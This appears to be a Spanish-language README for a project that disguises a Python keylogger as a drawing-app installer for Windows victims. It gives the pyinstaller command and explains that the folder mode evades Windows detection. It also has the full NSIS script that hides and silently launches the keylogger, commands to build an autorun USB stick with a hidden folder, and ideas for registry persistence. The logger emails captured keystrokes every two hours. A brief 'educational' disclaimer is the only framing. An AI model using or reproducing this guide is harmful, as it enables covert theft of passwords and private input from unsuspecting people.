# Instalador de un keylogger en una víctima Windows

Este proyecto está desarrollado solo para fines educativos.

## Idea de ataque en windows con keylogger:

Crear un instalador que instala una "app" ficticia de dibujo pero a la vez el instalador instala un keylogger(`keylogger.py`) en una carpeta oculta que se lanza automáticamente al finalizar el instalador.

El keylogger guarda todos los registros de teclado en un fichero y cada 2 horas envía por e-mail todo lo registrado. Se utiliza la librería [Sendgrid](https://sendgrid.com/solutions/email-api/) (Requiere una cuenta)

Para salir del keylogger la víctima puede teclear una combinación de teclas `<ctrl>+<alt>+q`
## EXE

Se utiliza [pyinstaller](https://www.pyinstaller.org/) que permite embeber un proyecto pyhton en un .exe

```bash
pyinstaller --onedir --name "draw" -w keylogger.py
```

--name

nombre del exe `ej: draw.exe`

--onedir

el ejecutable se puede crear de dos modos, en modo `onefile` que solo crea un exe o en modo carpeta `onedir` con el .exe y las librerías. Lo más limpio sería empaquetar el script en un solo fichero .exe. Pero en las pruebas realizadas Windows detecta más facilemente que es un virus cuando se utiliza `onefile`. En modo carpeta windows es más permisible. *De esta manera nos saltamos que windows bloque el keylogger*

El pyinstaller crea el directorio `dist\draw` con el exe `dist\draw\draw.exe` y las librerias
## Instalador del keylogger (ingeniería social)

Utilizando el software [nsis](https://nsis.sourceforge.io/Main_Page) se enmascara la instalación del keylogger como si fuera un software de dibujo, el usuario creerá que es un app de dibujo (es un enlace a app online) pero también instalará el keylogger en un directorio oculto (`.backup`)

Una vez finaliza la instalación se ejecuta el keylogger de forma transparente a la victima.

Pasos para generar el instalador:

- Copiar y renombrar `draw.url.dist_sample` `installer.nsi.dist_sample` y `LEEME.txt.dist_sample` en la carpeta `dist`.
- Renombrar la carpeta `dist/draw` por `dist/.backup`

```
copy draw.url.dist_sample dist\draw.url
copy installer.nsi.dist_sample dist\installer.nsi
copy LEEME.txt.dist_sample dist\LEEME.txt
move dist\draw dist\.backup

```

- Ejecutar el script `dist\installer.nsi` con NSIS para generar el instalador `draw-installer.exe`

Script NSIS

```
Outfile "draw-installer.exe"

InstallDir C:\Draw

Section

SetOutPath $INSTDIR

File LEEME.txt
File draw.url

SetOutPath $INSTDIR\.backup

File .backup\base_library.zip
File .backup\draw.exe
File .backup\libcrypto-1_1.dll
File .backup\libffi-7.dll
File .backup\libssl-1_1.dll
File .backup\pyexpat.pyd
File .backup\python310.dll
File .backup\select.pyd
File .backup\unicodedata.pyd
File .backup\VCRUNTIME140.dll
File .backup\_asyncio.pyd
File .backup\_bz2.pyd
File .backup\_ctypes.pyd
File .backup\_decimal.pyd
File .backup\_hashlib.pyd
File .backup\_lzma.pyd
File .backup\_multiprocessing.pyd
File .backup\_overlapped.pyd
File .backup\_queue.pyd
File .backup\_socket.pyd
File .backup\_ssl.pyd

SectionEnd

Section

SetOutPath $INSTDIR

SetFileAttributes "c:\Draw\.backup" HIDDEN

SetOutPath "c:\Draw\.backup"

Exec '"draw.exe"'

ExecShell "open" "C:\Draw"

SectionEnd

```
# Crear USB con autplay

```
copy autorun.inf.sample d:\autorun.inf
copy draw.lnk.sample d:\draw.lnk
copy LEEME.txt.dist_sample d:\LEEME.txt
md d:\.backup
attrib +h d:\.backup /s /d
copy dist\.backup d:\.backup
```
## Posibles mejoras

* Modificar el registro de windows para que se lance al inicio de Windows
* Salir si ya hay un keylogger ejecutandose.



